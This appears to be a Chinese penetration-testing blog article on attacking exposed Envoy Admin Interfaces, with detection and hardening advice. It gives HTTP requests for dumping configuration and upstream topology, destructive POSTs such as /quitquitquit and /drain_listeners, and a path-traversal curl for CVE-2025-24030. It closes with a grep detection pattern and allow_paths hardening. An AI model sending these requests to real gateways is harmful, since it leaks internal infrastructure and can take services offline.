---
title: "Envoy API网关管理面打点与Admin Interface利用技术"
date: 2026-06-16T17:10:00+08:00
draft: false
weight: 72
description: "围绕 Envoy Admin Interface、server_info、clusters、listeners、config_dump 与可变更接口，分析公开管理面导致的配置泄露、流量画像恢复、控制面影响与蓝队处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "API网关", "Envoy", "Admin Interface"]
---

# Envoy API网关管理面打点与Admin Interface利用技术

`Envoy` 的高价值不在“它是一个代理”，而在于它同时占据：

- 入口监听面
- 上游集群选择面
- 动态配置接收面
- TLS 终止与证书使用面
- 运行时统计与观测面
- 流量调试与优雅摘流控制面

因此，只要 `Admin Interface` 落入低信任网络，攻击者通常能一次性拿到：

- 当前所有 `listeners`、`routes`、`clusters`、`secrets`、`runtime` 的运行时视图
- 通过 `CDS`、`LDS`、`RDS`、`EDS` 动态下发的配置对象名
- 上游真实服务地址、端口、健康状态、权重、区域信息
- `service_cluster`、`service_node`、`service_zone` 等部署命名
- 证书主题名、SAN、过期时间与证书装载关系
- 热重启、日志级别、健康检查、流量摘流、进程退出等可操作控制点

更麻烦的是，Envoy 官方文档长期明确强调，`Admin Interface` 默认不带认证，而且不仅能读信息，还允许执行破坏性操作，例如：

- 动态调整日志级别
- 失败健康检查
- 摘流监听器
- 关闭进程
- 打开 profiler
- 导出配置快照

因此从渗透测试角度看，Envoy 管理面不是“辅助调试接口”，而是典型的高价值控制面目标。本文重点围绕：

1. 如何识别公开 Envoy Admin Interface
2. 如何利用 `server_info`、`listeners`、`clusters`、`config_dump` 恢复网关与控制面结构
3. 哪些接口只是信息泄露，哪些接口已经能直接改变网关行为
4. 公开历史风险链如何把“只读 metrics 面”升级为真正的管理面暴露
5. 蓝队如何从管理面访问、路径异常、配置导出和控制动作中回溯打点与利用

下文样例为脱敏后的实战常见结构，重点保留接口形态、关键字段和利用判断点。

---

## 0. 攻击面概览

### 0.1 常见端口与典型路径

Envoy Admin Interface 常见端口包括：

- `9901`
- `9902`
- `15000`
- `15001`
- `19000`
- `19001`

首轮可直接测试：

- `/`
- `/help`
- `/server_info`
- `/ready`
- `/listeners`
- `/clusters`
- `/stats`
- `/stats?format=json`
- `/stats/prometheus`
- `/config_dump`
- `/certs`
- `/init_dump`
- `/logging`

如果是较新的 `Envoy Gateway`、服务网格 sidecar、或自定义 bootstrap 配置，管理接口可能不直接暴露在业务入口，但依然可能通过：

- 节点本地调试端口转发
- 错误映射到 Service
- 监控采集端口
- 运维网段暴露
- 反向代理路径错误转发

出现在可达面上。

### 0.2 官方安全边界

Envoy 官方文档对管理接口风险表述非常直接：

- 管理接口会暴露私有运行信息
- 管理接口允许执行破坏性操作
- 管理接口默认不带认证
- 官方建议只允许安全网络访问
- 最佳实践是只绑定到 `127.0.0.1`
- 如必须有限暴露，可用 `allow_paths` 只放行特定只读路径，例如 `/ready`、`/stats`

这意味着实战里必须先区分四种情况：

1. 完整 admin listener 暴露
2. 仅只读探针路径暴露
3. `stats/prometheus` 等监控路径被错误映射到 admin listener
4. 管理面本来只允许内网访问，但可通过跳板、SSRF、Sidecar 邻近访问到达

### 0.3 打点收益优先级

Envoy 管理面在渗透测试中的打点优先级很高，因为它能把黑盒代理直接还原成白盒配置图。建议按以下顺序留档：

1. `server_info`
2. `listeners`
3. `clusters`
4. `config_dump`
5. `stats`
6. `certs`
7. `logging` / `drain_listeners` / `quitquitquit`

---

## 1. 第一轮打点：确认是否为 Envoy Admin Interface

### 1.1 `GET /`

Envoy 管理首页会返回一个 HTML 链接页，列出可访问的 admin endpoints。

#### 请求示例

```http
GET / HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Date: Tue, 16 Jun 2026 09:13:21 GMT
Connection: close
```

```html
<html>
  <head><title>Envoy Admin</title></head>
  <body>
    <a href="/server_info">server_info</a>
    <a href="/stats">stats</a>
    <a href="/clusters">clusters</a>
    <a href="/listeners">listeners</a>
    <a href="/config_dump">config_dump</a>
    <a href="/ready">ready</a>
    <a href="/logging">logging</a>
  </body>
</html>
```

这一页的价值不只是“识别产品”，更关键的是：

- 它会暴露当前编译启用和运行可用的管理接口
- 可以快速判断目标是否开放了变更型接口
- 很多弱暴露环境会阻止深层路径，但首页仍会被错误公开

### 1.2 `GET /help`

如果首页被去掉或 HTML 输出被裁剪，`/help` 往往更稳定。

#### 请求示例

```http
GET /help HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
admin commands are:
/certs
/clusters
/config_dump
/contention
/drain_listeners
/healthcheck/fail
/healthcheck/ok
/listeners
/logging
/ready
/runtime
/server_info
/stats
/stats/prometheus
/quitquitquit
```

这一步可以直接判断：

- 是否存在可写控制动作
- 是否启用了 profiler、contention、runtime 之类高价值调试能力
- 该实例是否是较完整的 admin listener，而不是被收敛后的 allowlist

### 1.3 `GET /server_info`

`/server_info` 是 Envoy 打点里最划算的一个入口，因为它通常会把版本、状态、节点身份和命令行选项线索直接给出来。

#### 请求示例

```http
GET /server_info HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "version": "1.31.2/9d1e5be4f18f",
  "state": "LIVE",
  "uptime_current_epoch": "84215s",
  "uptime_all_epochs": "84215s",
  "hot_restart_version": "11.104",
  "command_line_options": {
    "base_id": 0,
    "concurrency": 4,
    "config_path": "/etc/envoy/envoy.yaml",
    "log_level": "info",
    "component_log_level": "",
    "service_cluster": "edge-gateway-prod",
    "service_node": "envoy-gw-01",
    "service_zone": "az-a"
  },
  "node": {
    "id": "edge-gateway-prod~10.42.1.13~envoy-gw-01.default~default.svc.cluster.local",
    "cluster": "edge-gateway-prod"
  }
}
```

这里通常能回收：

- 精确版本号
- 运行状态是否 `LIVE`
- `service_cluster`、`service_node`、`service_zone`
- 配置文件路径
- 并发线程数
- 节点命名模式

这些信息对后续的价值非常高：

- 版本判断可帮助关联已知缺陷或版本差异
- 节点命名可映射环境层级
- `config_path` 会暴露宿主或容器文件系统布局

### 1.4 `GET /ready`

`/ready` 常被运维误以为“只是探针”，但它也是非常好的旁路识别点。

#### 请求示例

```http
GET /ready HTTP/1.1
Host: envoy-admin.target.example:9901
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Connection: close

LIVE
```

如果某个环境限制了 `allow_paths`，经常只会保留：

- `/ready`
- `/stats`
- `/stats/prometheus`

这时需要警惕它是否真的只放行了这些路径，还是匹配器过宽，导致后续可从路径拼接或路径穿越继续摸到真正的 admin endpoints。

---

## 2. 第二轮打点：恢复监听、路由与上游集群图

### 2.1 `GET /listeners`

`/listeners` 负责还原入口监听面。

#### 请求示例

```http
GET /listeners HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
ingress_http::0.0.0.0:8080
ingress_https::0.0.0.0:8443
internal_grpc::127.0.0.1:18000
admin::0.0.0.0:9901
```

这一步可直接判断：

- 管理端口是否错误绑定在 `0.0.0.0`
- 业务入口与管理入口是否共宿主
- 是否存在只绑定本地的内部控制平面监听
- 是否出现额外的 gRPC/xDS 监听面

#### JSON 请求示例

```http
GET /listeners?format=json HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "listener_statuses": [
    {
      "name": "ingress_https",
      "local_address": {
        "socket_address": {
          "address": "0.0.0.0",
          "port_value": 8443
        }
      }
    },
    {
      "name": "admin",
      "local_address": {
        "socket_address": {
          "address": "0.0.0.0",
          "port_value": 9901
        }
      }
    }
  ]
}
```

### 2.2 `GET /clusters`

`/clusters` 是最值钱的接口之一，因为它不仅暴露 cluster 名称，还会带出上游主机、健康状态、熔断和异常剔除信息。

#### 请求示例

```http
GET /clusters HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
payments_prod::observability_name::payments_prod
payments_prod::added_via_api::true
payments_prod::eds_service_name::payments.default.svc.cluster.local
payments_prod::version_info::2026-06-16T08:41:12Z/742
payments_prod::127.0.0.1:0::cx_active::0
payments_prod::10.42.7.31:8080::health_flags::healthy
payments_prod::10.42.7.31:8080::rq_success::18294
payments_prod::10.42.7.32:8080::health_flags::healthy
payments_prod::10.42.7.32:8080::rq_error::12
identity_admin::observability_name::identity_admin
identity_admin::10.42.9.18:8443::health_flags::healthy
identity_admin::10.42.9.18:8443::rq_timeout::3
```

这里能直接得到：

- 内网主机地址和端口
- cluster 命名与业务系统命名
- 是否经 `CDS/EDS` 动态下发
- 上游健康状态
- 某些后端的异常率、超时率、错误率

对渗透测试来说，这意味着：

- 内部服务枚举可以从“猜测”变成“已知”
- 业务和管理后端可能一起暴露在 cluster 名里
- 某些 cluster 名字会直接带出 `/admin`、`/internal`、`-ops`、`-debug` 之类敏感用途

#### JSON 请求示例

```http
GET /clusters?format=json HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "cluster_statuses": [
    {
      "name": "payments_prod",
      "added_via_api": true,
      "version_info": "2026-06-16T08:41:12Z/742",
      "host_statuses": [
        {
          "address": {
            "socket_address": {
              "address": "10.42.7.31",
              "port_value": 8080
            }
          },
          "stats": [
            {
              "name": "rq_success",
              "value": 18294
            }
          ],
          "health_status": {
            "eds_health_status": "HEALTHY"
          }
        }
      ]
    }
  ]
}
```

### 2.3 `GET /config_dump`

如果说 `clusters` 是上游图，那 `config_dump` 就是运行中的完整配置快照。

#### 请求示例

```http
GET /config_dump HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "configs": [
    {
      "@type": "type.googleapis.com/envoy.admin.v3.BootstrapConfigDump"
    },
    {
      "@type": "type.googleapis.com/envoy.admin.v3.ClustersConfigDump"
    },
    {
      "@type": "type.googleapis.com/envoy.admin.v3.ListenersConfigDump"
    },
    {
      "@type": "type.googleapis.com/envoy.admin.v3.RoutesConfigDump"
    },
    {
      "@type": "type.googleapis.com/envoy.admin.v3.SecretsConfigDump"
    }
  ]
}
```

继续细化查询时，最有价值的是：

- `dynamic_active_clusters`
- `dynamic_listeners`
- `RoutesConfigDump`
- `SecretsConfigDump`

#### 定向请求示例

```http
GET /config_dump?resource=dynamic_active_clusters&mask=cluster.name HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "configs": [
    {
      "@type": "type.googleapis.com/envoy.admin.v3.ClustersConfigDump",
      "dynamic_active_clusters": [
        {
          "cluster": {
            "name": "payments_prod"
          }
        },
        {
          "cluster": {
            "name": "identity_admin"
          }
        },
        {
          "cluster": {
            "name": "grafana_internal"
          }
        }
      ]
    }
  ]
}
```

如果直接拿整份 dump，经常还能恢复：

- 虚拟主机名和域名规则
- 路由匹配前缀
- TLS secret 名称
- `SDS` / `xDS` 控制面地址
- gRPC 控制平面 cluster
- Wasm/filter 扩展命名

#### 对安全影响的关键理解

虽然 Envoy 会尝试在 `config_dump` 中对 `private_key`、`password` 等字段做脱敏，但这并不意味着 dump 没有价值。攻击者依然可以从中拿到：

- 证书文件路径或 secret 名称
- xDS 服务地址
- 真实 cluster 名
- 路由对象名
- 动态配置版本号

这已经足够为后续横向、配置旁路或控制面攻击建立地图。

### 2.4 `GET /init_dump`

`/init_dump` 更适合在动态配置环境下判断“哪些资源还没准备好”。

#### 请求示例

```http
GET /init_dump HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "unready_targets_dumps": [
    {
      "name": "listener",
      "target_names": [
        "public_https_8443"
      ]
    },
    {
      "name": "cluster",
      "target_names": [
        "xds_cluster"
      ]
    }
  ]
}
```

它的利用价值在于：

- 暴露当前依赖的控制面组件
- 暴露正在失败或等待的 listener/cluster
- 帮助攻击者区分是静态配置代理还是强依赖动态控制平面的代理

---

## 3. 第三轮打点：运行时统计、证书与只读观测面

### 3.1 `GET /stats`

`/stats` 会返回运行时统计项，是 Envoy 运维最常用的接口之一，也是攻击者恢复流量形态的高价值入口。

#### 请求示例

```http
GET /stats HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
cluster.payments_prod.upstream_rq_total: 18342
cluster.payments_prod.upstream_rq_5xx: 12
cluster.payments_prod.membership_total: 2
cluster.identity_admin.upstream_cx_active: 1
http.ingress_https.downstream_rq_total: 641002
http.ingress_https.downstream_rq_5xx: 219
listener.0.0.0.0_8443.downstream_cx_total: 981274
server.state: 0
server.uptime: 84215
```

这一步可以帮助判断：

- 哪些入口真实在承载高流量
- 哪些 cluster 是关键业务
- 是否存在高错误率后端
- 当前实例是否正在承担控制面或管理面流量

#### 带过滤条件的请求示例

```http
GET /stats?filter=%5Ehttp%5C.ingress_https HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
http.ingress_https.downstream_cx_total: 981274
http.ingress_https.downstream_rq_total: 641002
http.ingress_https.downstream_rq_2xx: 639881
http.ingress_https.downstream_rq_4xx: 902
http.ingress_https.downstream_rq_5xx: 219
http.ingress_https.no_route: 14
```

这种过滤检索尤其适合：

- 精确识别哪个 listener 是公网入口
- 看某个 `stat_prefix` 是否与业务网关对应
- 判断是否存在异常扫描流量

### 3.2 `GET /stats/prometheus`

很多环境只想暴露 Prometheus 指标，但如果规则写得过宽，这个路径就可能成为管理面旁路入口的锚点。

#### 请求示例

```http
GET /stats/prometheus HTTP/1.1
Host: envoy-admin.target.example:19001
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
# TYPE envoy_server_live gauge
envoy_server_live 1
# TYPE envoy_cluster_membership_total gauge
envoy_cluster_membership_total{envoy_cluster_name="payments_prod"} 2
# TYPE envoy_http_downstream_rq_total counter
envoy_http_downstream_rq_total{envoy_http_conn_manager_prefix="ingress_https"} 641002
```

这个接口本身常被运维认为“只是 metrics”，但它的风险在于：

- 它通常和 admin listener 在同一端口
- 路由或路径规范化错误可能让攻击者借它摸到别的 admin path
- 对外开放时同样会暴露 cluster、listener、route 维度的运行时统计命名

### 3.3 `GET /certs`

`/certs` 不一定给你私钥，但会暴露证书部署关系。

#### 请求示例

```http
GET /certs HTTP/1.1
Host: envoy-admin.target.example:9901
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "certificates": [
    {
      "ca_cert": [],
      "cert_chain": [
        {
          "path": "/etc/envoy/tls/prod-edge.crt",
          "serial_number": "0A8F34C2",
          "days_until_expiration": "47",
          "subject_alt_names": [
            {
              "dns": "api.target.example"
            },
            {
              "dns": "admin.target.example"
            }
          ]
        }
      ]
    }
  ]
}
```

这一步常见价值包括：

- 暴露备用域名和内部域名
- 暴露证书文件路径
- 暴露管理域名是否与业务域名复用
- 暴露证书快过期、历史替换频率等运维节奏

---

## 4. 控制类接口：哪些已经不是“只读打点”

Envoy 官方文档明确规定，所有变更类操作都必须使用 `POST`。如果攻击者能对这些接口发起有效 `POST`，那么问题已经从“配置泄露”进入“可控破坏或状态操纵”阶段。

### 4.1 `POST /logging`

`/logging` 可动态修改日志级别。

#### 请求示例

```http
POST /logging?level=debug HTTP/1.1
Host: envoy-admin.target.example:9901
Content-Length: 0
Connection: close
```

#### 典型响应示例

```text
active loggers:
admin: debug
assert: debug
aws: debug
client: debug
config: debug
connection: debug
filter: debug
http: debug
main: debug
router: debug
upstream: debug
```

这类操作的安全意义在于：

- 会显著放大日志量
- 可能暴露更细的请求路径、路由决策、上游行为
- 在高流量环境下甚至能引发磁盘和性能压力

### 4.2 `POST /healthcheck/fail`

这类接口会让实例主动在健康检查面上变成失败状态。

#### 请求示例

```http
POST /healthcheck/fail HTTP/1.1
Host: envoy-admin.target.example:9901
Content-Length: 0
Connection: close
```

#### 典型响应示例

```text
OK
```

如果前面挂着负载均衡或服务网格控制器，这类动作可能造成：

- 当前代理被摘出流量
- 某个租户或节点的流量切换
- 服务抖动或灰度异常

### 4.3 `POST /drain_listeners`

摘流接口对生产影响更直接。

#### 请求示例

```http
POST /drain_listeners?graceful HTTP/1.1
Host: envoy-admin.target.example:9901
Content-Length: 0
Connection: close
```

#### 典型响应示例

```text
OK
```

这会触发：

- listener 进入 draining
- 新连接不再正常接入
- 既有流量逐步被转移或中断

对红队利用或故障注入来说，这已经是明显的可用性破坏点。

### 4.4 `POST /quitquitquit`

Envoy 官方文档明确提到管理接口可用于关闭服务器，`quitquitquit` 就是最典型的“高风险控制端点”。

#### 请求示例

```http
POST /quitquitquit HTTP/1.1
Host: envoy-admin.target.example:9901
Content-Length: 0
Connection: close
```

#### 典型响应示例

```text
OK
```

一旦该请求成功，后续通常会在外部监控上表现为：

- listener 端口中断
- readiness 失败
- 容器或进程重启
- Sidecar 重新拉起

### 4.5 `GET` 误用判断

Envoy 文档还强调：所有 mutation 必须用 `POST`。如果你用 `GET` 请求这些路径，应该返回无效请求而不产生副作用。

#### 请求示例

```http
GET /quitquitquit HTTP/1.1
Host: envoy-admin.target.example:9901
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 400 Bad Request
Content-Type: text/plain
Connection: close

invalid admin request
```

这一步有两个意义：

- 能确认目标是否符合官方安全行为
- 能判断前面是否还有代理、WAF 或路径改写导致方法语义被篡改

---

## 5. 历史风险链：从监控路径升级到管理面暴露

### 5.1 风险本质

Envoy 的核心问题长期不是“有没有后台登录框”，而是它把高权限管理功能直接暴露成无认证 HTTP 接口。只要暴露边界配置错了，攻击链就很短：

1. 找到 admin listener
2. 导出运行时配置和集群图
3. 确认是否有可写控制接口
4. 实施摘流、退出、调试或利用控制面缺陷

### 5.2 `CVE-2025-24030` / `GHSA-j777-63hf-hx76`

2025 年公开披露的 `Envoy Gateway` 风险，是一个非常典型的“只暴露 metrics，结果把 admin 一起带出来”的案例。

问题核心在于：

- 代理本想只暴露 `/stats/prometheus`
- 但路径匹配和规范化处理不严格
- 集群内攻击者可通过路径穿越从 metrics 路径访问其他 admin endpoints

#### 公开利用示例

```http
GET /stats/prometheus/../../config_dump HTTP/1.1
Host: proxy-service.default.svc.cluster.local:19001
Connection: close
```

或命令行形式：

```bash
curl --path-as-is http://<Proxy-Service-ClusterIP>:19001/stats/prometheus/../../config_dump
```

#### 预期结果

如果目标存在该问题，请求不会停留在 metrics 输出，而是返回真正的 admin 配置快照。

#### 典型响应示例

```json
{
  "configs": [
    {
      "@type": "type.googleapis.com/envoy.admin.v3.BootstrapConfigDump"
    },
    {
      "@type": "type.googleapis.com/envoy.admin.v3.ListenersConfigDump"
    },
    {
      "@type": "type.googleapis.com/envoy.admin.v3.RoutesConfigDump"
    }
  ]
}
```

这个案例的重要性不只在于 CVE 本身，而在于它揭示了现实中的常见误区：

- 运维以为暴露的是 metrics，不是 admin
- 但底层实际还是同一个高权限管理 listener
- 一旦路径约束做错，公开只读面会立刻退化为完整控制面

### 5.3 利用判断要点

评估这类风险时，建议重点确认：

1. `stats/prometheus` 是否与 admin listener 共端口
2. 是否只允许 `GET /stats/prometheus`，还是用了宽泛前缀匹配
3. 是否对路径做了 `normalize_path`
4. 是否存在 `..`、编码斜杠、重复斜杠等旁路
5. 是否能够进一步访问：
   - `/config_dump`
   - `/server_info`
   - `/logging`
   - `/quitquitquit`

### 5.4 其它现实中的高危误配

除公开 CVE 外，Envoy 管理面实战里最常见的高危误配还包括：

- `admin.address` 绑定 `0.0.0.0`
- 容器直接 `-p 9901:9901`
- Sidecar admin port 被 Service 选择器带出来
- 反向代理把 `/` 或 `/config_dump` 转发到 admin listener
- 只用网段策略，缺少主机级 firewall 与 localhost 绑定

这些问题未必有单独 CVE，但在渗透中同样是直接高价值入口。

---

## 6. 蓝队日志、检测与处置

### 6.1 优先收集哪些日志

如果要追查 Envoy 管理面打点和利用，优先级最高的是：

- Envoy admin access log
- 宿主机或容器 stdout/stderr
- 前置反向代理访问日志
- K8s Ingress / Service / LB 日志
- 进程管理与容器重启日志

老版本文档中常见 `access_log_path`，而当前版本通常通过 `access_log` 扩展定义 listener 访问日志。无论哪种方式，只要 admin listener 单独记日志，都能显著提升检测能力。

### 6.2 建议重点关注的请求路径

应重点检索：

- `/server_info`
- `/listeners`
- `/clusters`
- `/config_dump`
- `/certs`
- `/stats`
- `/stats/prometheus`
- `/logging`
- `/drain_listeners`
- `/healthcheck/fail`
- `/quitquitquit`

其中尤其高危的是：

- `POST /logging`
- `POST /drain_listeners`
- `POST /healthcheck/fail`
- `POST /quitquitquit`

### 6.3 典型日志示例

#### 访问日志示例

```text
[2026-06-16T09:44:12.510Z] "GET /config_dump HTTP/1.1" 200 - 0 19841 3 "-" "curl/8.7.1" "-" "198.51.100.27:51422" "127.0.0.1:9901"
[2026-06-16T09:44:15.872Z] "GET /stats/prometheus/../../config_dump HTTP/1.1" 200 - 0 19432 2 "-" "curl/8.7.1" "-" "10.244.3.19:54002" "10.96.182.14:19001"
[2026-06-16T09:44:19.334Z] "POST /logging?level=debug HTTP/1.1" 200 - 0 227 1 "-" "python-requests/2.31.0" "-" "198.51.100.27:51430" "127.0.0.1:9901"
```

#### 运行日志示例

```text
[2026-06-16 09:44:19.334][1][info][main] [source/server/admin/admin.cc:123] admin request: POST /logging?level=debug
[2026-06-16 09:45:03.114][1][warning][main] [source/server/server.cc:240] caught quitquitquit, shutting down
[2026-06-16 09:45:03.115][1][info][upstream] [source/common/upstream/cluster_manager_impl.cc:2100] shutting down cluster manager
```

### 6.4 异常路径特征

针对路径穿越和路径旁路，建议重点检索：

- `../`
- `%2e%2e`
- `%2f`
- `%2F`
- `//config_dump`
- `/stats/prometheus/../../`

示例检索思路：

```bash
grep -E '\.\./|%2e%2e|%2[fF]|/stats/prometheus/.*/\.\./' /var/log/envoy/admin_access.log
```

如果管理 listener 没有单独 access log，则应同步检查：

- 节点级反向代理日志
- Sidecar 所在 Pod 的 `kubectl logs`
- 上游监控采集器请求记录

### 6.5 从副作用反推利用

即使没有完整请求日志，也可从副作用判断管理接口被动过：

- 日志级别突然升高
- readiness 变为失败
- listener 进入 draining
- Envoy 进程异常退出或频繁重启
- 管理端口短时间被高频探测
- `config_dump` / `stats` 输出流量异常增大

特别是以下组合，优先按高危事件处理：

1. 出现 `/stats/prometheus/../../config_dump`
2. 随后出现 `/server_info`、`/clusters`
3. 紧接着出现 `POST /logging` 或 `POST /quitquitquit`

这通常说明攻击者已经从探测进入有效控制阶段。

---

## 7. 加固与缓解建议

### 7.1 首先处理暴露面

最优先的不是“给它做一层路径黑名单”，而是：

- 将 admin listener 绑定到 `127.0.0.1`
- 不直接发布 admin 端口到公网或业务网段
- Sidecar admin port 不纳入业务 Service
- 宿主机和容器层加防火墙/NetworkPolicy

### 7.2 使用 `allow_paths` 最小化暴露

如果运维确实需要健康检查或指标采集，可按官方建议只放行必要路径，例如：

```yaml
admin:
  address:
    socket_address:
      protocol: TCP
      address: 127.0.0.1
      port_value: 9901
  allow_paths:
  - exact: /ready
  - prefix: /stats
  profile_path: /tmp/envoy.prof
```

但要注意：

- `prefix` 本身也要结合路径规范化审查
- 不要把 `allow_paths` 当作认证
- 对 `/stats/prometheus` 这类路径仍要防穿越和异常 path-as-is 请求

### 7.3 分离监控与管理

理想情况下：

- metrics 使用独立采集策略
- admin listener 不直接暴露给 Prometheus 之外的主体
- 不把完整 admin interface 与 metrics 共享到同一个宽泛入口

### 7.4 变更接口重点防护

对以下接口必须视为高危控制操作：

- `/logging`
- `/healthcheck/fail`
- `/drain_listeners`
- `/quitquitquit`

应确保：

- 只有本机或受控运维平面可达
- 有单独访问日志
- 出现时有即时告警

### 7.5 升级与修补

对于公开披露的 `Envoy Gateway` admin 暴露链，应至少：

- 升级到修复版本
- 对 `/stats/prometheus` 路由做严格精确匹配
- 启用路径规范化
- 审查历史 bootstrap patch 和 gateway 配置

---

## 8. 打点评估清单

确认目标是 Envoy 后，建议至少留档以下内容：

1. `admin.address` 是否可能绑定公网或业务网段
2. `/`、`/help`、`/server_info` 的完整响应
3. `/listeners` 是否暴露 `admin`、业务监听、内部 gRPC/xDS 监听
4. `/clusters` 是否泄露上游内网地址、健康状态和动态配置来源
5. `/config_dump` 是否可导出完整 listener/route/cluster/secret 图谱
6. `/stats`、`/stats/prometheus` 是否暴露运行特征与 cluster 命名
7. 是否存在 `/logging`、`/drain_listeners`、`/quitquitquit` 等有效控制点
8. 是否存在从 metrics 路径进入 admin 的历史暴露链或路径旁路
9. 蓝队能否在 admin access log、stdout、容器重启与探针异常之间形成闭环

---

## 9. 总结

Envoy `Admin Interface` 在渗透测试里极具价值，因为它把代理层本来最难黑盒恢复的内容一次性白盒化了：

- `server_info` 给出节点身份与运行参数
- `listeners` 给出监听边界
- `clusters` 给出上游拓扑和健康状态
- `config_dump` 给出完整配置快照
- `stats` 给出运行强度和行为痕迹
- `logging`、`drain_listeners`、`quitquitquit` 给出直接控制能力

因此，公开的 Envoy 管理接口不应被看作“普通调试页面”，而应视为高敏感控制面暴露。尤其在云原生环境中，一旦再叠加 metrics 错误映射、路径规范化缺陷或 cluster 内邻近访问条件，攻击者就可能从一次简单打点迅速进入配置恢复、流量操控和可用性破坏阶段。
